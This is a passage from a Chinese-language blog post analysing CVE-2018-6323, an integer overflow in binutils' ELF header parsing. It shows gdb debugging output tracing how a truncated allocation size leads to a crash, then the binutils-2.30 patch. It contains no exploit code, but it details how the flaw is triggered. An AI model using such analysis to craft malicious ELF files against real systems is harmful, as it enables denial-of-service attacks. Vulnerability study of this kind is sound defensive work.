value</span><br><span class="line"></span><br><span class="line">Breakpoint <span class="number">1</span>, bfd_elf32_object_p (abfd=<span class="number">0x8250a08</span>) at elfcode.h:<span class="number">780</span></span><br><span class="line"><span class="number">780</span>	      elf_tdata (abfd)-&gt;phdr = (Elf_Internal_Phdr *) bfd_alloc (abfd, amt);</span><br></pre></td></tr></table></figure>

<p>截断后高位的 <code>0x7</code> 被丢弃， eax 为 <code>0x00000000</code>，且 OVERFLOW 的标志位被设置,如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ ni</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: <span class="number">0x0</span></span><br><span class="line">EBX: <span class="number">0x8250a08</span> --&gt; <span class="number">0x8250810</span> (<span class="string">"test"</span>)</span><br><span class="line">ECX: <span class="number">0xd</span> (<span class="string">'\r'</span>)</span><br><span class="line">EDX: <span class="number">0x5f</span> (<span class="string">'_'</span>)</span><br><span class="line">ESI: <span class="number">0x8250ac8</span> --&gt; <span class="number">0x464c457f</span></span><br><span class="line">EDI: <span class="number">0xd</span> (<span class="string">'\r'</span>)</span><br><span class="line">EBP: <span class="number">0x81ca560</span> --&gt; <span class="number">0x81c9429</span> (<span class="string">"elf32-i386"</span>)</span><br><span class="line">ESP: <span class="number">0xbffff370</span> --&gt; <span class="number">0xb7fe97eb</span> (&lt;_dl_fixup+<span class="number">11</span>&gt;:	add    esi,<span class="number">0x15815</span>)</span><br><span class="line">EIP: <span class="number">0x80aeba3</span> (&lt;bfd_elf32_object_p+<span class="number">1859</span>&gt;:	sub    esp,<span class="number">0x4</span>)</span><br><span class="line">EFLAGS: <span class="number">0xa07</span> (CARRY PARITY adjust zero sign trap INTERRUPT direction OVERFLOW)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   <span class="number">0x80aeb97</span> &lt;bfd_elf32_object_p+<span class="number">1847</span>&gt;:	jmp    <span class="number">0x80ae613</span> &lt;bfd_elf32_object_p+<span class="number">435</span>&gt;</span><br><span class="line">   <span class="number">0x80aeb9c</span> &lt;bfd_elf32_object_p+<span class="number">1852</span>&gt;:	lea    esi,[esi+eiz*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x80aeba0</span> &lt;bfd_elf32_object_p+<span class="number">1856</span>&gt;:	imul   eax,eax,<span class="number">0x38</span></span><br><span class="line">=&gt; <span class="number">0x80aeba3</span> &lt;bfd_elf32_object_p+<span class="number">1859</span>&gt;:	sub    esp,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x80aeba6</span> &lt;bfd_elf32_object_p+<span class="number">1862</span>&gt;:	<span class="keyword">xor</span>    edx,edx</span><br><span class="line">   <span class="number">0x80aeba8</span> &lt;bfd_elf32_object_p+<span class="number">1864</span>&gt;:	push   edx</span><br><span class="line">   <span class="number">0x80aeba9</span> &lt;bfd_elf32_object_p+<span class="number">1865</span>&gt;:	push   eax</span><br><span class="line">   <span class="number">0x80aebaa</span> &lt;bfd_elf32_object_p+<span class="number">1866</span>&gt;:	push   ebx</span><br><span class="line">[------------------------------------<span class="built_in">stack</span>-------------------------------------]</span><br><span class="line"><span class="number">0000</span>| <span class="number">0xbffff370</span> --&gt; <span class="number">0xb7fe97eb</span> (&lt;_dl_fixup+<span class="number">11</span>&gt;:	add    esi,<span class="number">0x15815</span>)</span><br><span class="line"><span class="number">0004</span>| <span class="number">0xbffff374</span> --&gt; <span class="number">0x8250ac8</span> --&gt; <span class="number">0x464c457f</span></span><br><span class="line"><span class="number">0008</span>| <span class="number">0xbffff378</span> --&gt; <span class="number">0xd</span> (<span class="string">'\r'</span>)</span><br><span class="line"><span class="number">0012</span>| <span class="number">0xbffff37c</span> --&gt; <span class="number">0x0</span></span><br><span class="line"><span class="number">0016</span>| <span class="number">0xbffff380</span> --&gt; <span class="number">0x8250a0c</span> --&gt; <span class="number">0x81ca560</span> --&gt; <span class="number">0x81c9429</span> (<span class="string">"elf32-i386"</span>)</span><br><span class="line"><span class="number">0020</span>| <span class="number">0xbffff384</span> --&gt; <span class="number">0x82482a0</span> --&gt; <span class="number">0x9</span> (<span class="string">'\t'</span>)</span><br><span class="line"><span class="number">0024</span>| <span class="number">0xbffff388</span> --&gt; <span class="number">0x8250a08</span> --&gt; <span class="number">0x8250810</span> (<span class="string">"test"</span>)</span><br><span class="line"><span class="number">0028</span>| <span class="number">0xbffff38c</span> --&gt; <span class="number">0x81ca560</span> --&gt; <span class="number">0x81c9429</span> (<span class="string">"elf32-i386"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"><span class="number">0x080aeba3</span>	<span class="number">780</span>	      elf_tdata (abfd)-&gt;phdr = (Elf_Internal_Phdr *) bfd_alloc (abfd, amt);</span><br></pre></td></tr></table></figure>

<p>随后<code>eax=0</code>作为第二个参数传入<code>bfd_alloc()</code>函数，由如下定义可看出参数为0时，分配不成功</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">FUNCTION</span></span><br><span class="line"><span class="comment">	bfd_alloc</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">SYNOPSIS</span></span><br><span class="line"><span class="comment">	void *bfd_alloc (bfd *abfd, bfd_size_type wanted);</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">DESCRIPTION</span></span><br><span class="line"><span class="comment">	Allocate a block of @var&#123;wanted&#125; bytes of memory attached to</span></span><br><span class="line"><span class="comment">	&lt;&lt;abfd&gt;&gt; and return a pointer to it.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>而在后续中，<code>objalloc_free()</code>又对这个分配的内存进行释放，由于这是个不存在的地址，于是抛出了异常。</p>
<h3 id="5-补丁"><a href="#5-补丁" class="headerlink" title="5. 补丁"></a>5. 补丁</h3><p>在binutils-2.30中，补丁将原本为<code>i_ehdrp-&gt;e_phnum</code>转化为了<code>unsigned long bfd_size_type</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">-      amt = <span class="keyword">sizeof</span> (*i_shdrp) * i_ehdrp-&gt;e_shnum;</span><br><span class="line">+      amt = <span class="keyword">sizeof</span> (*i_shdrp) * (bfd_size_type) i_ehdrp-&gt;e_shnum;</span><br><span class="line">...</span><br><span class="line">-      amt = i_ehdrp-&gt;e_phnum * <span class="keyword">sizeof</span> (*i_phdr);</span><br><span class="line">+      amt = (bfd_size_type) i_ehdrp-&gt;e_phnum * <span class="keyword">sizeof</span> (*i_phdr);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/02/16/CVE-2018-6323%E5%88%86%E6%9E%90/" data-id="ck6p697dc00004kml5eo91n0l" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li></ul>

    </footer>
  </div>
  
    
  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE/" rel="tag">CVE</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CVE/" style="font-size: 10px;">CVE</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/02/16/CVE-2018-6323%E5%88%86%E6%9E%90/">CVE-2018-6323分析</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 ConzeHsu<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>